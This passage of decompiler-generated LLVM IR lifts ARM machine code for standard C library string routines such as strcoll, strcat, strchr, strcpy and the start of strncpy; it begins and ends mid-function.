  store i32 %v0_13e44, i32* %v1_13e5046, align 4
  %v3_13e5047 = add i32 %v0_13e5028, 4
  %v4_13e5048 = inttoptr i32 %v3_13e5047 to i32*
  %v5_13e5049 = load i32, i32* @ip, align 4
  store i32 %v5_13e5049, i32* %v4_13e5048, align 4
  %v6_13e5050 = add i32 %v0_13e5028, 8
  store i32 %v6_13e5050, i32* %r3.global-to-local, align 4
  %v0_13e5451 = load i32, i32* @r2, align 4
  %v1_13e5452 = add i32 %v0_13e5451, -8
  store i32 %v1_13e5452, i32* %r2.global-to-local, align 4
  %v5_13e5c53 = icmp slt i32 %v1_13e5452, 8
  br i1 %v5_13e5c53, label %dec_label_pc_13e50.dec_label_pc_13e88.loopexit_crit_edge, label %dec_label_pc_13e60

dec_label_pc_13e60:                               ; preds = %dec_label_pc_13e50.preheader, %dec_label_pc_13e48.dec_label_pc_13e50_crit_edge
  %v6_13e5055 = phi i32 [ %v6_13e50, %dec_label_pc_13e48.dec_label_pc_13e50_crit_edge ], [ %v6_13e5050, %dec_label_pc_13e50.preheader ]
  %v0_13e5054 = phi i32 [ %v12_13e7c, %dec_label_pc_13e48.dec_label_pc_13e50_crit_edge ], [ %v0_13e5028, %dec_label_pc_13e50.preheader ]
  %v1_13e60 = inttoptr i32 %v6_13e5055 to i32*
  %v2_13e60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13e60, i32* %v1_13e60, align 4
  %v3_13e60 = add i32 %v0_13e5054, 12
  %v4_13e60 = inttoptr i32 %v3_13e60 to i32*
  %v5_13e60 = load i32, i32* @ip, align 4
  store i32 %v5_13e60, i32* %v4_13e60, align 4
  %v6_13e60 = add i32 %v0_13e5054, 16
  store i32 %v6_13e60, i32* %r3.global-to-local, align 4
  %v0_13e64 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e64 = add i32 %v0_13e64, -8
  store i32 %v1_13e64, i32* %r2.global-to-local, align 4
  %v5_13e6c = icmp slt i32 %v1_13e64, 8
  br i1 %v5_13e6c, label %dec_label_pc_13e60.dec_label_pc_13e88.loopexit_crit_edge, label %dec_label_pc_13e70

dec_label_pc_13e70:                               ; preds = %dec_label_pc_13e60
  %v1_13e70 = inttoptr i32 %v6_13e60 to i32*
  %v2_13e70 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13e70, i32* %v1_13e70, align 4
  %v3_13e70 = add i32 %v0_13e5054, 20
  %v4_13e70 = inttoptr i32 %v3_13e70 to i32*
  %v5_13e70 = load i32, i32* @ip, align 4
  store i32 %v5_13e70, i32* %v4_13e70, align 4
  %v6_13e70 = add i32 %v0_13e5054, 24
  store i32 %v6_13e70, i32* %r3.global-to-local, align 4
  %v0_13e74 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e74 = add i32 %v0_13e74, -8
  store i32 %v1_13e74, i32* %r2.global-to-local, align 4
  %v5_13e7c = icmp slt i32 %v1_13e74, 8
  br i1 %v5_13e7c, label %dec_label_pc_13e70.dec_label_pc_13e88.loopexit_crit_edge, label %dec_label_pc_13e48

dec_label_pc_13e48:                               ; preds = %dec_label_pc_13e70
  %v7_13e7c = inttoptr i32 %v6_13e70 to i32*
  %v8_13e7c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_13e7c, i32* %v7_13e7c, align 4
  %v9_13e7c = add i32 %v0_13e5054, 28
  %v10_13e7c = inttoptr i32 %v9_13e7c to i32*
  %v11_13e7c = load i32, i32* @ip, align 4
  store i32 %v11_13e7c, i32* %v10_13e7c, align 4
  %v12_13e7c = add i32 %v0_13e5054, 32
  store i32 %v12_13e7c, i32* %r3.global-to-local, align 4
  %v6_13e80 = load i32, i32* %r2.global-to-local, align 4
  %v7_13e80 = add i32 %v6_13e80, -8
  store i32 %v7_13e80, i32* %r2.global-to-local, align 4
  %v5_13e4c = icmp slt i32 %v7_13e80, 8
  br i1 %v5_13e4c, label %dec_label_pc_13e48.dec_label_pc_13e88.loopexit_crit_edge, label %dec_label_pc_13e48.dec_label_pc_13e50_crit_edge

dec_label_pc_13e48.dec_label_pc_13e50_crit_edge:  ; preds = %dec_label_pc_13e48
  %v2_13e50.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13e50 = inttoptr i32 %v12_13e7c to i32*
  store i32 %v2_13e50.pre, i32* %v1_13e50, align 4
  %v3_13e50 = add i32 %v0_13e5054, 36
  %v4_13e50 = inttoptr i32 %v3_13e50 to i32*
  %v5_13e50 = load i32, i32* @ip, align 4
  store i32 %v5_13e50, i32* %v4_13e50, align 4
  %v6_13e50 = add i32 %v0_13e5054, 40
  store i32 %v6_13e50, i32* %r3.global-to-local, align 4
  %v0_13e54 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e54 = add i32 %v0_13e54, -8
  store i32 %v1_13e54, i32* %r2.global-to-local, align 4
  %v5_13e5c = icmp slt i32 %v1_13e54, 8
  br i1 %v5_13e5c, label %dec_label_pc_13e50.dec_label_pc_13e88.loopexit_crit_edge, label %dec_label_pc_13e60

dec_label_pc_13e50.dec_label_pc_13e88.loopexit_crit_edge: ; preds = %dec_label_pc_13e48.dec_label_pc_13e50_crit_edge, %dec_label_pc_13e50.preheader
  %v1_13e54.lcssa = phi i32 [ %v1_13e5452, %dec_label_pc_13e50.preheader ], [ %v1_13e54, %dec_label_pc_13e48.dec_label_pc_13e50_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13e88

dec_label_pc_13e48.dec_label_pc_13e88.loopexit_crit_edge: ; preds = %dec_label_pc_13e48
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13e88

dec_label_pc_13e60.dec_label_pc_13e88.loopexit_crit_edge: ; preds = %dec_label_pc_13e60
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13e88

dec_label_pc_13e70.dec_label_pc_13e88.loopexit_crit_edge: ; preds = %dec_label_pc_13e70
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13e88

dec_label_pc_13e88:                               ; preds = %dec_label_pc_13e44, %dec_label_pc_13e50.dec_label_pc_13e88.loopexit_crit_edge, %dec_label_pc_13e48.dec_label_pc_13e88.loopexit_crit_edge, %dec_label_pc_13e60.dec_label_pc_13e88.loopexit_crit_edge, %dec_label_pc_13e70.dec_label_pc_13e88.loopexit_crit_edge, %entry
  %v0_13e90 = phi i32 [ %v0_13e24, %entry ], [ %v1_13e74, %dec_label_pc_13e70.dec_label_pc_13e88.loopexit_crit_edge ], [ %v1_13e64, %dec_label_pc_13e60.dec_label_pc_13e88.loopexit_crit_edge ], [ %v7_13e80, %dec_label_pc_13e48.dec_label_pc_13e88.loopexit_crit_edge ], [ %v1_13e54.lcssa, %dec_label_pc_13e50.dec_label_pc_13e88.loopexit_crit_edge ], [ %v0_13e48.pr, %dec_label_pc_13e44 ]
  %v2_13e88 = icmp eq i32 %v0_13e90, 0
  store i1 %v2_13e88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e88, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_13e88
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_13e88
  %v1_13e90 = sub i32 7, %v0_13e90
  store i32 %v1_13e90, i32* %r2.global-to-local, align 4
  %v3_13e94 = mul i32 %v1_13e90, 4
  %v4_13e94 = add i32 %v3_13e94, ptrtoint (i32* @global_var_13e9c.1105 to i32)
  call void @__pseudo_branch(i32 %v4_13e94)
  %v0_13e9c = load i32, i32* %r1.global-to-local, align 4
  %v1_13e9c = trunc i32 %v0_13e9c to i8
  %v2_13e9c = load i32, i32* %r3.global-to-local, align 4
  %v3_13e9c = inttoptr i32 %v2_13e9c to i8*
  store i8 %v1_13e9c, i8* %v3_13e9c, align 1
  %v4_13e9c = load i32, i32* %r3.global-to-local, align 4
  %v5_13e9c = add i32 %v4_13e9c, 1
  store i32 %v5_13e9c, i32* %r3.global-to-local, align 4
  %v0_13ea0 = load i32, i32* %r1.global-to-local, align 4
  %v1_13ea0 = trunc i32 %v0_13ea0 to i8
  %v3_13ea0 = inttoptr i32 %v5_13e9c to i8*
  store i8 %v1_13ea0, i8* %v3_13ea0, align 1
  %v4_13ea0 = load i32, i32* %r3.global-to-local, align 4
  %v5_13ea0 = add i32 %v4_13ea0, 1
  store i32 %v5_13ea0, i32* %r3.global-to-local, align 4
  %v0_13ea4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13ea4 = trunc i32 %v0_13ea4 to i8
  %v3_13ea4 = inttoptr i32 %v5_13ea0 to i8*
  store i8 %v1_13ea4, i8* %v3_13ea4, align 1
  %v4_13ea4 = load i32, i32* %r3.global-to-local, align 4
  %v5_13ea4 = add i32 %v4_13ea4, 1
  store i32 %v5_13ea4, i32* %r3.global-to-local, align 4
  %v0_13ea8 = load i32, i32* %r1.global-to-local, align 4
  %v1_13ea8 = trunc i32 %v0_13ea8 to i8
  %v3_13ea8 = inttoptr i32 %v5_13ea4 to i8*
  store i8 %v1_13ea8, i8* %v3_13ea8, align 1
  %v4_13ea8 = load i32, i32* %r3.global-to-local, align 4
  %v5_13ea8 = add i32 %v4_13ea8, 1
  store i32 %v5_13ea8, i32* %r3.global-to-local, align 4
  %v0_13eac = load i32, i32* %r1.global-to-local, align 4
  %v1_13eac = trunc i32 %v0_13eac to i8
  %v3_13eac = inttoptr i32 %v5_13ea8 to i8*
  store i8 %v1_13eac, i8* %v3_13eac, align 1
  %v4_13eac = load i32, i32* %r3.global-to-local, align 4
  %v5_13eac = add i32 %v4_13eac, 1
  store i32 %v5_13eac, i32* %r3.global-to-local, align 4
  %v0_13eb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_13eb0 = trunc i32 %v0_13eb0 to i8
  %v3_13eb0 = inttoptr i32 %v5_13eac to i8*
  store i8 %v1_13eb0, i8* %v3_13eb0, align 1
  %v4_13eb0 = load i32, i32* %r3.global-to-local, align 4
  %v5_13eb0 = add i32 %v4_13eb0, 1
  store i32 %v5_13eb0, i32* %r3.global-to-local, align 4
  %v0_13eb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13eb4 = trunc i32 %v0_13eb4 to i8
  %v3_13eb4 = inttoptr i32 %v5_13eb0 to i8*
  store i8 %v1_13eb4, i8* %v3_13eb4, align 1
  %v4_13eb4 = load i32, i32* %r3.global-to-local, align 4
  %v5_13eb4 = add i32 %v4_13eb4, 1
  store i32 %v5_13eb4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_13e50, { 1, 0 }
  uselistorder i32 %v12_13e7c, { 1, 2, 0 }
  uselistorder i32 %v0_13e5054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_13e48.pr, { 0, 2, 1 }
  uselistorder i32 %v6_13e38, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_13e2c, { 1, 0 }
  uselistorder i32 %v0_13e24, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 8, 9, 1, 10, 11, 13, 12, 7, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 3, 0, 5, 8, 7, 4, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13e88, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_13e60, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_13ec4.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_13ec4 = phi i32 [ %v0_13ec4.pre, %bb ], [ %v5_13ec4, %bb3 ]
  %v0_13ec0 = phi i32 [ %tmp, %bb ], [ %v5_13ec0, %bb3 ]
  %v1_13ec0 = inttoptr i32 %v0_13ec0 to i8*
  %v2_13ec0 = load i8, i8* %v1_13ec0, align 1
  %v3_13ec0 = zext i8 %v2_13ec0 to i32
  store i32 %v3_13ec0, i32* @r2, align 4
  %v1_13ec4 = inttoptr i32 %v0_13ec4 to i8*
  %v2_13ec4 = load i8, i8* %v1_13ec4, align 1
  %v3_13ec4 = zext i8 %v2_13ec4 to i32
  %v2_13ec8 = icmp eq i8 %v2_13ec0, 0
  br i1 %v2_13ec8, label %.dec_label_pc_13ed4_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_13ec4 = add i32 %v0_13ec4, 1
  %v5_13ec0 = add i32 %v0_13ec0, 1
  %v10_13ecc = icmp eq i8 %v2_13ec0, %v2_13ec4
  br i1 %v10_13ecc, label %entry, label %dec_label_pc_13ed4

.dec_label_pc_13ed4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_13ed4

dec_label_pc_13ed4:                               ; preds = %bb3, %.dec_label_pc_13ed4_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_13ed4_crit_edge ], [ %v3_13ec0, %bb3 ]
  %v2_13ed4.pre-phi = sub nsw i32 %.pn, %v3_13ec4
  ret i32 %v2_13ed4.pre-phi

; uselistorder directives
  uselistorder i32 %v0_13ec0, { 1, 0 }
  uselistorder i32 %v0_13ec4, { 1, 0 }
  uselistorder label %dec_label_pc_13ed4, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13f44

dec_label_pc_13f44:                               ; preds = %dec_label_pc_13f44, %entry
  %v0_13f44 = phi i32 [ %v5_13f44, %dec_label_pc_13f44 ], [ %tmp, %entry ]
  %v1_13f44 = inttoptr i32 %v0_13f44 to i8*
  %v2_13f44 = load i8, i8* %v1_13f44, align 1
  %v5_13f44 = add i32 %v0_13f44, 1
  store i32 %v5_13f44, i32* %r2.global-to-local, align 4
  %v2_13f48 = icmp eq i8 %v2_13f44, 0
  store i1 %v2_13f48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13f48, label %dec_label_pc_13f50, label %dec_label_pc_13f44

dec_label_pc_13f50:                               ; preds = %dec_label_pc_13f44
  %v1_13f50 = add i32 %v0_13f44, -1
  store i32 %v1_13f50, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13f54

dec_label_pc_13f54:                               ; preds = %dec_label_pc_13f54, %dec_label_pc_13f50
  %v2_13f5c = phi i32 [ %v6_13f5c, %dec_label_pc_13f54 ], [ %v1_13f50, %dec_label_pc_13f50 ]
  %v0_13f54 = load i32, i32* @r1, align 4
  %v1_13f54 = inttoptr i32 %v0_13f54 to i8*
  %v2_13f54 = load i8, i8* %v1_13f54, align 1
  %v5_13f54 = add i32 %v0_13f54, 1
  store i32 %v5_13f54, i32* @r1, align 4
  %v2_13f58 = icmp eq i8 %v2_13f54, 0
  store i1 %v2_13f58, i1* %cpsr_z.global-to-local, align 1
  %v3_13f5c = add i32 %v2_13f5c, 1
  %v4_13f5c = inttoptr i32 %v3_13f5c to i8*
  store i8 %v2_13f54, i8* %v4_13f5c, align 1
  %v5_13f5c = load i32, i32* %r2.global-to-local, align 4
  %v6_13f5c = add i32 %v5_13f5c, 1
  store i32 %v6_13f5c, i32* %r2.global-to-local, align 4
  %v0_13f60 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13f60, label %dec_label_pc_13f64, label %dec_label_pc_13f54

dec_label_pc_13f64:                               ; preds = %dec_label_pc_13f54
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_13f5c, { 1, 0 }
  uselistorder i32 %v5_13f44, { 1, 0 }
  uselistorder i32 %v0_13f44, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_13f68 = load i32, i32* @r5, align 4
  %v9_13f68 = load i32, i32* @r6, align 4
  %v1_13f6c = urem i32 %arg1, 256
  br label %dec_label_pc_13f8c

dec_label_pc_13f74:                               ; preds = %dec_label_pc_13f8c
  %v3_13f74 = load i8, i8* %.0, align 1
  %v4_13f74 = zext i8 %v3_13f74 to i32
  %v9_13f78 = icmp eq i32 %v4_13f74, %v1_13f6c
  br i1 %v9_13f78, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_13f74
  ret i32 %v1_13f8c

bb24:                                             ; preds = %dec_label_pc_13f74
  %v2_13f80 = icmp eq i8 %v3_13f74, 0
  %v2_13f84 = add i32 %v1_13f8c, 1
  %v3_13f84 = inttoptr i32 %v2_13f84 to i8*
  br i1 %v2_13f80, label %dec_label_pc_14060, label %dec_label_pc_13f8c

dec_label_pc_13f8c:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_13f84, %bb24 ]
  %v1_13f8c = ptrtoint i8* %.0 to i32
  %v2_13f8c = urem i32 %v1_13f8c, 4
  %v3_13f8c = icmp eq i32 %v2_13f8c, 0
  br i1 %v3_13f8c, label %dec_label_pc_13f94, label %dec_label_pc_13f74

dec_label_pc_13f94:                               ; preds = %dec_label_pc_13f8c
  %v4_13f94 = mul nuw nsw i32 %v1_13f6c, 256
  %v5_13f94 = or i32 %v4_13f94, %v1_13f6c
  %v4_13f9c = mul i32 %v5_13f94, 65536
  %v5_13f9c = or i32 %v4_13f9c, %v5_13f94
  br label %dec_label_pc_13fa0

dec_label_pc_13fa0:                               ; preds = %dec_label_pc_14058, %dec_label_pc_13fe0, %dec_label_pc_13f94
  %v0_14004 = phi i32 [ %v1_13f8c, %dec_label_pc_13f94 ], [ %v4_13fa0, %dec_label_pc_13fe0 ], [ %v4_13fa0, %dec_label_pc_14058 ]
  %v1_13fa0 = inttoptr i32 %v0_14004 to i32*
  %v2_13fa0 = load i32, i32* %v1_13fa0, align 4
  %v4_13fa0 = add i32 %v0_14004, 4
  %v2_13fa8 = xor i32 %v2_13fa0, %v5_13f9c
  %v2_13fb4 = add i32 %v2_13fa0, 2130640639
  %v1_13fb8 = sub i32 -1, %v2_13fa0
  %v2_13fbc = xor i32 %v2_13fb4, %v1_13fb8
  %v2_13fc0 = add i32 %v2_13fa8, 2130640639
  %v1_13fc8 = sub i32 -1, %v2_13fa8
  %v2_13fcc = and i32 %v2_13fbc, -2130640640
  %v2_13fd0 = xor i32 %v2_13fc0, %v1_13fc8
  %v2_13fd4 = icmp eq i32 %v2_13fcc, 0
  %v2_13fd8 = and i32 %v2_13fd0, -2130640640
  store i32 %v2_13fd8, i32* @lr, align 4
  br i1 %v2_13fd4, label %dec_label_pc_13fe0, label %dec_label_pc_13fe8

dec_label_pc_13fe0:                               ; preds = %dec_label_pc_13fa0
  %v2_13fe0 = icmp eq i32 %v2_13fd8, 0
  br i1 %v2_13fe0, label %dec_label_pc_13fa0, label %dec_label_pc_13fe8

dec_label_pc_13fe8:                               ; preds = %dec_label_pc_13fa0, %dec_label_pc_13fe0
  %v2_13fe8 = inttoptr i32 %v0_14004 to i8*
  %v3_13fe8 = load i8, i8* %v2_13fe8, align 1
  %v4_13fe8 = zext i8 %v3_13fe8 to i32
  %v1_13ff0 = add i32 %v0_14004, 1
  %v1_13ff4 = add i32 %v0_14004, 2
  %v9_13ff8 = icmp eq i32 %v4_13fe8, %v1_13f6c
  %v1_13ffc = add i32 %v0_14004, 3
  store i32 %v1_13ffc, i32* @ip, align 4
  br i1 %v9_13ff8, label %dec_label_pc_14004, label %dec_label_pc_1400c

dec_label_pc_14004:                               ; preds = %dec_label_pc_13fe8
  store i32 %v6_13f68, i32* @r5, align 4
  store i32 %v9_13f68, i32* @r6, align 4
  ret i32 %v0_14004

dec_label_pc_1400c:                               ; preds = %dec_label_pc_13fe8
  %v2_1400c = icmp eq i8 %v3_13fe8, 0
  br i1 %v2_1400c, label %dec_label_pc_14060, label %dec_label_pc_14014

dec_label_pc_14014:                               ; preds = %dec_label_pc_1400c
  %v2_14014 = inttoptr i32 %v1_13ff0 to i8*
  %v3_14014 = load i8, i8* %v2_14014, align 1
  %v4_14014 = zext i8 %v3_14014 to i32
  %v9_14018 = icmp eq i32 %v4_14014, %v1_13f6c
  br i1 %v9_14018, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_14014
  store i32 %v6_13f68, i32* @r5, align 4
  store i32 %v9_13f68, i32* @r6, align 4
  ret i32 %v1_13ff0

bb26:                                             ; preds = %dec_label_pc_14014
  %v2_14020 = icmp eq i8 %v3_14014, 0
  br i1 %v2_14020, label %dec_label_pc_14060, label %dec_label_pc_14028

dec_label_pc_14028:                               ; preds = %bb26
  %v2_14028 = inttoptr i32 %v1_13ff4 to i8*
  %v3_14028 = load i8, i8* %v2_14028, align 1
  %v4_14028 = zext i8 %v3_14028 to i32
  %v9_1402c = icmp eq i32 %v4_14028, %v1_13f6c
  br i1 %v9_1402c, label %dec_label_pc_14034, label %dec_label_pc_1403c

dec_label_pc_14034:                               ; preds = %dec_label_pc_14028
  store i32 %v6_13f68, i32* @r5, align 4
  store i32 %v9_13f68, i32* @r6, align 4
  ret i32 %v1_13ff4

dec_label_pc_1403c:                               ; preds = %dec_label_pc_14028
  %v2_1403c = icmp eq i8 %v3_14028, 0
  br i1 %v2_1403c, label %dec_label_pc_14060, label %dec_label_pc_14044

dec_label_pc_14044:                               ; preds = %dec_label_pc_1403c
  %v2_14044 = inttoptr i32 %v1_13ffc to i8*
  %v3_14044 = load i8, i8* %v2_14044, align 1
  %v4_14044 = zext i8 %v3_14044 to i32
  %v9_14048 = icmp eq i32 %v4_14044, %v1_13f6c
  br i1 %v9_14048, label %dec_label_pc_14050, label %dec_label_pc_14058

dec_label_pc_14050:                               ; preds = %dec_label_pc_14044
  store i32 %v6_13f68, i32* @r5, align 4
  store i32 %v9_13f68, i32* @r6, align 4
  ret i32 %v1_13ffc

dec_label_pc_14058:                               ; preds = %dec_label_pc_14044
  %v2_14058 = icmp eq i8 %v3_14044, 0
  br i1 %v2_14058, label %dec_label_pc_14060, label %dec_label_pc_13fa0

dec_label_pc_14060:                               ; preds = %bb24, %dec_label_pc_14058, %dec_label_pc_1403c, %bb26, %dec_label_pc_1400c
  store i32 %v6_13f68, i32* @r5, align 4
  store i32 %v9_13f68, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_13fa0, { 1, 0 }
  uselistorder i32 %v2_13fa0, { 0, 2, 1 }
  uselistorder i32 %v0_14004, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_13f94, { 1, 0 }
  uselistorder i32 %v1_13f8c, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_13f6c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_13f68, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_13f68, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_14060, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_13fe8, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_14070 = sub i32 %arg1, %tmp
  %v1_14074 = add i32 %v2_14070, -1
  store i32 %v1_14074, i32* %r2.global-to-local, align 4
  %v2_140784 = load i8, i8* %arg2, align 1
  %v5_140786 = add i32 %tmp, 1
  store i32 %v5_140786, i32* %r1.global-to-local, align 4
  %v2_1407c7 = icmp eq i8 %v2_140784, 0
  store i1 %v2_1407c7, i1* %cpsr_z.global-to-local, align 1
  %v5_140808 = inttoptr i32 %arg1 to i8*
  store i8 %v2_140784, i8* %v5_140808, align 1
  %v0_140849 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_140849, label %dec_label_pc_14088, label %dec_label_pc_14078.dec_label_pc_14078_crit_edge

dec_label_pc_14078.dec_label_pc_14078_crit_edge:  ; preds = %entry, %dec_label_pc_14078.dec_label_pc_14078_crit_edge
  %v0_14078.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_14080.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14078 = inttoptr i32 %v0_14078.pre to i8*
  %v2_14078 = load i8, i8* %v1_14078, align 1
  %v5_14078 = add i32 %v0_14078.pre, 1
  store i32 %v5_14078, i32* %r1.global-to-local, align 4
  %v2_1407c = icmp eq i8 %v2_14078, 0
  store i1 %v2_1407c, i1* %cpsr_z.global-to-local, align 1
  %v4_14080 = add i32 %v5_14078, %v3_14080.pre
  %v5_14080 = inttoptr i32 %v4_14080 to i8*
  store i8 %v2_14078, i8* %v5_14080, align 1
  %v0_14084 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14084, label %dec_label_pc_14088, label %dec_label_pc_14078.dec_label_pc_14078_crit_edge

dec_label_pc_14088:                               ; preds = %dec_label_pc_14078.dec_label_pc_14078_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14078.dec_label_pc_14078_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_1408c = icmp eq i32 %arg2, 3
  store i1 %v7_1408c, i1* %cpsr_z.global-to-local, align 1
  %v1_14094 = add i32 %arg1, -1
  store i32 %v1_14094, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_14110, label %dec_label_pc_1409c

dec_label_pc_1409c:                               ; preds = %entry
  %v3_1409c = udiv i32 %arg2, 4
  store i32 %v3_1409c, i32* @lr, align 4
  %v0_140a0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_140a0

dec_label_pc_140a0:                               ; preds = %dec_label_pc_140ec, %dec_label_pc_1409c
  %v2_140a8 = phi i32 [ %v6_140e0, %dec_label_pc_140ec ], [ %v1_14094, %dec_label_pc_1409c ]
  %v0_140a0 = phi i32 [ %v1_140f0, %dec_label_pc_140ec ], [ %v0_140a0.pre, %dec_label_pc_1409c ]
  %v1_140a0 = inttoptr i32 %v0_140a0 to i8*
  %v2_140a0 = load i8, i8* %v1_140a0, align 1
  %v3_140a0 = zext i8 %v2_140a0 to i32
  store i32 %v3_140a0, i32* %r3.global-to-local, align 4
  %v2_140a4 = icmp eq i8 %v2_140a0, 0
  store i1 %v2_140a4, i1* %cpsr_z.global-to-local, align 1
  %v3_140a8 = add i32 %v2_140a8, 1
  %v4_140a8 = inttoptr i32 %v3_140a8 to i8*
  store i8 %v2_140a0, i8* %v4_140a8, align 1
  %v5_140a8 = load i32, i32* %ip.global-to-local, align 4
  %v6_140a8 = add i32 %v5_140a8, 1
  store i32 %v6_140a8, i32* %ip.global-to-local, align 4
  %v0_140ac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_140ac, label %dec_label_pc_140fc, label %dec_label_pc_140b0

dec_label_pc_140b0:                               ; preds = %dec_label_pc_140a0
  %v0_140b0 = load i32, i32* @r1, align 4
  %v1_140b0 = add i32 %v0_140b0, 1
  %v2_140b0 = inttoptr i32 %v1_140b0 to i8*
  %v3_140b0 = load i8, i8* %v2_140b0, align 1
  %v4_140b0 = zext i8 %v3_140b0 to i32
  store i32 %v4_140b0, i32* %r3.global-to-local, align 4
  %v2_140b4 = icmp eq i8 %v3_140b0, 0
  store i1 %v2_140b4, i1* %cpsr_z.global-to-local, align 1
  %v3_140b8 = add i32 %v5_140a8, 2
  %v4_140b8 = inttoptr i32 %v3_140b8 to i8*
  store i8 %v3_140b0, i8* %v4_140b8, align 1
  %v5_140b8 = load i32, i32* %ip.global-to-local, align 4
  %v6_140b8 = add i32 %v5_140b8, 1
  store i32 %v6_140b8, i32* %ip.global-to-local, align 4
  %v0_140bc = load i32, i32* @r1, align 4
  %v1_140bc = add i32 %v0_140bc, 1
  store i32 %v1_140bc, i32* %r1.global-to-local, align 4
  %v0_140c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_140c0, label %dec_label_pc_140fc, label %dec_label_pc_140c4

dec_label_pc_140c4:                               ; preds = %dec_label_pc_140b0
  %v1_140c4 = add i32 %v0_140bc, 2
  %v2_140c4 = inttoptr i32 %v1_140c4 to i8*
  %v3_140c4 = load i8, i8* %v2_140c4, align 1
  %v4_140c4 = zext i8 %v3_140c4 to i32
  store i32 %v4_140c4, i32* %r3.global-to-local, align 4
  %v2_140c8 = icmp eq i8 %v3_140c4, 0
  store i1 %v2_140c8, i1* %cpsr_z.global-to-local, align 1
  %v3_140cc = add i32 %v5_140b8, 2
